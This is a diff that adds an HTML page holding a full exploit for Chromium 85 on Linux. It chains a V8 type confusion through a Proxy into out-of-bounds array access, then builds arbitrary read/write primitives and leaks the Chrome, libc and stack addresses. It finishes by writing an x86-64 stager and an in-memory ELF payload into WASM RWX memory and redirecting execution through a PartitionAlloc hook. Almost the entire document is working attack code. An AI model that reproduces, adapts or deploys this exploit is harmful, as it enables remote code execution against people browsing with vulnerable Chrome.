@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="elf.js"></script>
+        <script src="embedded.js"></script>
+    </head>
+    <body>
+        <script> 
+            var buf = new ArrayBuffer(8); 
+            var f64_buf = new Float64Array(buf);
+            var u64_buf = new Uint32Array(buf);
+            
+            function ftoi(val) { 
+                    f64_buf[0] = val;
+                    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
+            }
+
+            function itof(val) { 
+                    u64_buf[0] = Number(val & 0xffffffffn);
+                    u64_buf[1] = Number(val >> 32n);
+                    return f64_buf[0];
+            }
+
+            function exploit() {
+                function force_gc() {
+                    for (var i = 0; i < 0x80000; ++i) {
+                        var a = new ArrayBuffer();
+                    }
+                }
+
+                function empty() {}
+
+                function f(nt) {
+                    a.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy 
+                    ? 2.2 
+                    : 2261634.000029185);
+                    for(let i = 0; i < 0x100000; i++) {}
+                }
+                let p = new Proxy(Object, {
+                    get: function() {
+                        a[0] = {};
+                        b = [1.2, 1.2];
+                    
+                        return Object.prototype;
+                    }
+                });
+                function main(o) {
+                    for (let i = 0; i < 0x100000; i++) {}
+                    f(o);
+                }
+
+                function oob() {
+                    for(let i = 0; i < 0x100000; i++) empty();
+                    main(empty);
+                    main(empty);
+                    main(p)
+                }
+
+                let a = [,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.1];
+                let b;
+
+                oob();
+                
+                let c = [1.1, 1.1, 1.1]
+                let d = [{}, {}];
+                let e = new Float64Array(8)
+
+                let flt_map = ftoi(b[14]) >> 32n;
+                let obj_map = ftoi(b[25]) >> 32n;
+             
+                console.log("[+] OOB array lenght: " + b.length);
+
+                // fixed offsets for Chromium Linux Version 85.0.4154.0
+                const kBaseSearchSpaceOffset    = 0xa500000n;
+                const kHooksEnabled             = 0xa7bade8         //base::PartitionAllocHooks::hooks_enabled_
+                const kFreeObserverHook         = 0xa7badf8         //base::PartitionAllocHooks::free_observer_hook_
+                const kGOTOffset                = 0xa6df418;        //GOT offset for chrome
+                const kWasmCodeGC               = 0xa6ea141;        //v8::internal::FLAG_wasm_code_gc
+
+                function addrof(obj) {
+                    let tmp = b[14];
+                    b[14] = itof(((obj_map << 32n) + (ftoi(tmp) & 0xffffffffn)));
+                    let tmp_elm = c[0];
+                    c[0] = obj;
+                    b[14] = itof(((flt_map << 32n) + (ftoi(tmp) & 0xffffffffn)));  
+                    let leak = itof(ftoi(c[0]) & 0xffffffffn);
+                    b[14] = tmp;
+                    c[0] = tmp_elm;
+                    return leak;
+                }
+
+                function weak_read(addr) {
+                    let tmp = b[15];
+                    b[15] = itof((((ftoi(addr)-8n) << 32n) + (ftoi(tmp) & 0xffffffffn)));
+                    let result = c[0];
+                    b[15] = tmp; 
+                    return result;
+                }
+
+                function weak_write(addr, what) {
+                    let tmp = b[15];
+                    b[15] = itof((((ftoi(addr)-8n) << 32n) + (ftoi(tmp) & 0xffffffffn)));
+                    c[0] = what;
+                    b[15] = tmp; 
+                    return;
+                }
+
+                let root_isolate_addr = itof(ftoi(addrof(e)) + BigInt(5*8));
+                let root_isolate = itof(ftoi(weak_read(root_isolate_addr)) & ~(0xffn))
+                console.log("[+] Root Isolate: 0x" + ftoi(root_isolate).toString(16));
+
+                // creating a set of temporary AB to create (GC unsafe) arb read/write primitives
+		        // that allows an qword to be read/written to an 8 byte unboxed address (not possible with weak_write)
+                
+                let bff = new ArrayBuffer(8)
+                let bff1 = new ArrayBuffer(8)
+
+                let dataview = new DataView(bff);
+                let dataview1 = new DataView(bff1);
+
+                let buf_addr = addrof(bff);  
+                let backing_store_addr = itof(ftoi(buf_addr) + 0x14n);
+                backing_store_addr = itof(ftoi(root_isolate) | ftoi(backing_store_addr) -1n);
+
+                let buf_addr1 = addrof(bff1);  
+                let backing_store_addr1 = itof(ftoi(buf_addr1) + 0x14n);
+               
+                // overwritting the value of backing_store of 2 with the address of 1
+                // to be able to overwrite the backing_store of 1 by writting to 2
+                weak_write(backing_store_addr1, backing_store_addr);
+                
+                function set_arb_primitive_backing_store(boxed, addr, 
+                        backing_store_addr_=backing_store_addr, 
+                        root_isolate_=root_isolate) {                    
+                    if (boxed && ftoi(addr) % 2n != 0) {
+		                addr = itof(ftoi(root_isolate_) | ftoi(addr) -1n);
+	            }
+                    dataview1.setBigUint64(0, ftoi(addr), true);
+                }
+
+                function arb_read(addr, len, boxed=false) {
+                    let result;
+                    
+                    set_arb_primitive_backing_store(boxed, addr)
+
+                    // dereferencing backing_store AB 1
+                    if (len == 1) {
+                        result = dataview.getUint8(0)
+                    } else if (len == 2) {
+                        result = dataview.getUint16(0, true)
+                    } else if (len == 4) {
+                        result = dataview.getUint32(0, true)
+                    } else {
+                        result = dataview.getBigUint64(0, true);
+                    }
+                    return result;
+                }
+
+                function arb_write(addr, val, len, boxed=false) {
+
+                    set_arb_primitive_backing_store(boxed, addr)
+
+                    if (len == 1) {
+                        dataview.setUint8(0, val)
+                    } else if (len == 2) {
+                        dataview.setUint16(0, val, true)
+                    } else if (len == 4) {
+                        dataview.setUint32(0, val, true)
+                    } else {
+                        dataview.setBigUint64(0, val, true);
+                    }
+                    return;
+                }
+
+                function get_image_base(ptr) {
+                    let dword = 0;
+                    let centinel = ptr;
+
+                    while (dword !== 0x464c457f) {
+                        centinel -= 0x1000n;
+                        dword = arb_read(itof(centinel), 4);
+                       
+                    }
+                    return centinel;
+                }
+
+                /// constructing stable addrof
+                let lo_array_obj = new Array(1048577);
+                let elements_ptr = weak_read(itof(ftoi(addrof(lo_array_obj)) + 8n));
+                elements_ptr = itof(ftoi(elements_ptr) & 0xffffffffn)
+                
+                let leak_array_buffer = new ArrayBuffer(0x10);
+                let dd = new DataView(leak_array_buffer)
+
+                let leak_array_buffer_addr = ftoi(addrof(leak_array_buffer))
+                let backing_store_ptr = itof(leak_array_buffer_addr + 0x14n);
+
+                elements_ptr = itof(ftoi(root_isolate) | ftoi(elements_ptr) -1n);
+                weak_write(backing_store_ptr, elements_ptr)
+               
+                function stable_addrof(obj) {
+                    lo_array_obj[0] = obj;
+                    return  itof(BigInt(dd.getUint32(0x8, true)));
+                }
+                
+                // constructing stable read for v8 heap
+                let heap = new ArrayBuffer(8);
+                let heap_accesor = new DataView(heap);
+
+                let heap_addr_backing_store =  itof(ftoi(stable_addrof(heap)) + 0x14n);
+                let heap_accesor_length = itof(ftoi(stable_addrof(heap_accesor)) + 0x18n);
+              
+                weak_write(heap_addr_backing_store, root_isolate)
+                weak_write(heap_accesor_length, 0xffffffff);
+
+                // retrieving chrome image base
+                let div = window.document.createElement('div');
+                let div_addr = stable_addrof(div);
+                let _HTMLDivElement = itof(ftoi(div_addr) + 0xCn); 
+                let HTMLDivElement_addr = weak_read(_HTMLDivElement);
+
+                let chrome_ptr = itof((ftoi(HTMLDivElement_addr) - kBaseSearchSpaceOffset) & ~(0xfffn));
+                let chrome_base = get_image_base(ftoi(chrome_ptr));
+                console.log("[*] Chrome base : 0x" + chrome_base.toString(16));
+
+                // constructing GC safe chrome arb read/write
+                let chrome_mem = new ArrayBuffer(8);
+                let chrome_accesor = new DataView(chrome_mem);
+
+                let addr = stable_addrof(chrome_mem);                
+                weak_write(itof(ftoi(addr) + 0x14n), itof(chrome_base));
+                weak_write(itof(ftoi(stable_addrof(chrome_accesor)) + 0x18n), 0xffffffff);
+                
+                // constructing GC safe libc arb read/write
+                let libc_leak = chrome_accesor.getFloat64(kGOTOffset, true);
+                libc_leak = itof(ftoi(libc_leak) & ~(0xfffn));
+                let libc_base = get_image_base(ftoi(libc_leak));
+                console.log("[+] Libc base: 0x" + libc_base.toString(16))
+
+                let libc_mem = new ArrayBuffer(8);
+                let libc_accesor = new DataView(libc_mem);
+
+                addr = stable_addrof(libc_mem);                
+                weak_write(itof(ftoi(addr) + 0x14n), itof(libc_base));
+                weak_write(itof(ftoi(stable_addrof(libc_accesor)) + 0x18n), 0xffffffff);
+                
+                // invoking GCs
+                force_gc();                 // Minor GC
+                force_gc();
+                new ArrayBuffer(0x80000000) // Major GC
+                
+                // ----------------------------------------- We are GC safe from here
+               
+                // Retrieving stack infoleak from libc envrion symbol
+                let elf = new Elf(libc_base, libc_accesor);
+                let environ_addr = elf.resolve_reloc("__environ", R_X86_64_GLOB_DAT);
+                let stack_leak = libc_accesor.getBigUint64(Number(environ_addr-libc_base), true)
+                console.log("[+] environ@libc: 0x" + stack_leak.toString(16))
+               
+                // setting a safe address for SHELF stack
+                let shelf_stack = (stack_leak-0x80000n)  & ~(0xfffn);
+                let shelf_delta = Number(sizeof_Elf64_Ehdr + (BigInt(G_AT_PHNUM) * sizeof_Elf64_Phdr));
+
+                console.log("[+] SHELF stack: 0x" + shelf_stack.toString(16));
+
+                // constructing accessor for SHELF stack
+                let stack_mem = new ArrayBuffer(8);
+                let stack_accesor = new DataView(stack_mem);
+                let bstore_addr = itof(ftoi(stable_addrof(stack_mem)) + 0x14n);
+                let dview_length = itof(ftoi(stable_addrof(stack_accesor)) + 0x18n)
+                heap_accesor.setBigUint64(Number(ftoi(bstore_addr)-1n), BigInt(shelf_stack), true);
+                heap_accesor.setUint32(Number(ftoi(dview_length)-1n), 0xffffffff, true);
+            
+                var wasm_code = new Uint8Array(
+                    [
+                        0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,
+                        1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,
+                        0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
+                        128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,
+                        111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,
+                        128,0,1,132,128,128,128,0,0,65,0,11
+                    ]
+                );
+
+                // forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
+                console.log("[+] Allocating RWX memory");
+                for (let i = 0; i < 0x10000; i++) {
+                    new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+                }
+
+                // disabling garbage collection of wasm code
+                chrome_accesor.setBigUint64(kWasmCodeGC, 0n);
+
+                // retrieving start address of RWX region
+                let wasm_mod = new WebAssembly.Module(wasm_code);            
+                let wasm_instance = new WebAssembly.Instance(wasm_mod);
+                let wasm_entry = wasm_instance.exports.main;
+
+                let wasm_instance_addr = stable_addrof(wasm_instance);
+                wasm_instance_addr = ftoi(wasm_instance_addr) + 0x68n -1n;
+                console.log("[+] WASM instance: 0x" + wasm_instance_addr.toString(16))
+
+                let rwx_page_addr = itof(heap_accesor.getBigUint64(Number(wasm_instance_addr), true));
+                console.log("[+] RWX region: 0x"+ ftoi(rwx_page_addr).toString(16));
+              
+                // constructing SHELF image
+                function setup_shelf(addr, payload, len) {
+                    let wasm_mem = new ArrayBuffer(8);
+                    let wasm_accessor = new DataView(wasm_mem);
+
+                    let wasm_bstore_addr = itof(ftoi(stable_addrof(wasm_mem)) + 0x14n);
+                    let wasm_dview_length = itof(ftoi(stable_addrof(wasm_accessor)) + 0x18n)
+
+                    heap_accesor.setBigUint64(Number(ftoi(wasm_bstore_addr)-1n), ftoi(addr), true);
+                    heap_accesor.setUint32(Number(ftoi(wasm_dview_length)-1n), 0xffffffff, true);
+
+                    function bigint_to_array(val) {
+                        var arr = [0, 0, 0, 0, 0, 0, 0, 0];
+                        for ( var i = 0; i < arr.length; i++ ) {
+                            let byte = Number(val & 0xffn);
+                            arr[i] = byte;
+                            val >>= 8n;
+                        }
+                        return arr;
+                    };
+
+                    /* [stager] :
+                        48 b8 42 42 42 42 42 42 42 42       movabs rax,0x4242424242424242
+                        48 89 c4                            mov rsp,rax
+                        48 31 db                            xor rbx,rbx
+                        48 31 c9                            xor rcx,rcx
+                        48 31 d2                            xor rdx,rdx
+                        48 31 f6                            xor rsi,rsi
+                        48 31 ff                            xor rdi,rdi
+                        48 b8 41 41 41 41 41 41 41 41       movabs rax,0x4141414141414141
+                        ff e0                               jmp rax 
+                    */
+
+                    let stack_addr_bytes = bigint_to_array(shelf_stack - BigInt(8*3));
+                    let entry_point_bytes = bigint_to_array(ftoi(rwx_page_addr) + BigInt(G_AT_ENTRY))
+                    let stager = new Uint8Array([
+                        0x48, 0xB8, 
+                        ...stack_addr_bytes,
+                        0x48, 0x89, 0xc4,
+                        0x48, 0x31, 0xdb,
+                        0x48, 0x31, 0xc9,
+                        0x48, 0x31, 0xd2,
+                        0x48, 0x31, 0xf6,
+                        0x48, 0x31, 0xff,
+                        0x48, 0xb8,
+                        ...entry_point_bytes,
+                        0xff, 0xe0
+                    ]);
+
+                    console.log("[+] Constructing stager")
+                    for (let i = 0; i < stager.length; i++) {
+                        wasm_accessor.setUint8(i, stager[i]);
+                    }
+
+                    for (let i = 0; i < len; i++) {
+                        wasm_accessor.setUint8(shelf_delta+i, payload[i]);
+                    }
+                }
+                console.log("[+] Constructing SHELF image of size " +  payload_len);
+                setup_shelf(rwx_page_addr, payload, payload_len)
+                    
+                // constructing Auxv in SHELF stack
+                console.log("[+] Constructing Auxiliar vector in SHELF stack")
+                let phdr_addr = ftoi(stable_addrof(phdr)) + 0x28n;
+                let phdr_addr_bstore = heap_accesor.getBigUint64(Number(phdr_addr -1n), true)
+              
+                stack_accesor.setBigUint64(0x00, AT_PHDR, true);
+                stack_accesor.setBigUint64(0x08, phdr_addr_bstore, true);
+                stack_accesor.setBigUint64(0x10, AT_PHNUM, true);
+                stack_accesor.setBigUint64(0x18, BigInt(G_AT_PHNUM), true);
+                stack_accesor.setBigUint64(0x20, AT_ENTRY, true); 
+                stack_accesor.setBigUint64(0x28, ftoi(rwx_page_addr) + BigInt(G_AT_ENTRY), true);
+                stack_accesor.setBigUint64(0x30, AT_RANDOM, true);  
+                stack_accesor.setBigUint64(0x38, ftoi(rwx_page_addr), true);
+                stack_accesor.setBigUint64(0x40, AT_PHENT, true);  
+                stack_accesor.setBigUint64(0x48, sizeof_Elf64_Phdr, true);
+                stack_accesor.setBigUint64(0x50, AT_NULL, true);  
+                stack_accesor.setBigUint64(0x58, 0n, true);
+
+                console.log("[+] Executing SHELF!")
+
+                //wasm_entry();
+                chrome_accesor.setUint8(kHooksEnabled, 1);
+                chrome_accesor.setBigUint64(kFreeObserverHook, ftoi(rwx_page_addr), true);
+            }
+
+            exploit()
+            
+        </script>  
+    </body>
+</html>
